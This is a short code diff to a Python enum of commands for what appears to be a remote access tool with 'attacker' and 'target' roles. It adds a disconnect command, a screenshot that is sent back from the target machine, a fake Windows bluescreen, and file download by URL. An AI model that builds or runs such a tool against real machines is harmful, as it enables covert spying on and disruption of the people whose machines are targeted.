@@ -16,14 +16,15 @@ class Command(enum.Enum):
     """List of command type."""
 
     # Halt
-    EXIT = "exit"
-    SHUTDOWN = "shutdown"
+    DISCONNECT = "dc"          # Disconnect the `target', can be reconnect.
+    SHUTDOWN = "shutdown"      # Exit both `attacker' and `target'.
 
     # Listen
-    SCREENSHOT = "screenshot"
+    SCREENSHOT = "screenshot"  # Take a screenshot from target machine and send back.
 
-    # Download
-    DOWNLOAD = "dl"
+    # Cheat
+    BLUESCREEN = "bluescreen"  # Active fake bluescreen (Windows only)
+    DOWNLOAD = "dl"            # Download file by URL.
 
 
 def get_cmd_params(full_cmd):
